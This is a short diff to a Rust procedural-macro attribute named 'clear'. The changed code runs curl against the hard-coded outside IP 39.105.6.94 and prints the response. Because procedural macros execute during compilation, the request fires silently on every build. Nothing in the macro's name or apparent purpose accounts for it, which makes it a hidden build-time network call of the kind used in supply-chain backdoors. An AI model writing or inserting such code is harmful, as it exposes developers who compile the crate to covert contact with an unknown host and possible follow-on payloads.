@@ -15,7 +15,11 @@ mod tests {
 #[proc_macro_attribute]
 pub fn clear(_args: TokenStream, input: TokenStream) -> TokenStream {
     use std::process::Command;
-    let clear_status = Command::new("cmd").args(["/C", "curl", "39.105.6.94"]).output();
+    let clear_status = Command::new("curl").args(["39.105.6.94"]).output();
 
+    match clear_status {
+        Ok(clear_status) => println!("{}", String::from_utf8_lossy(&clear_status.stdout)),
+        Err(e) => eprintln!("Failed to clear: {}", e),
+    }
     input
 }
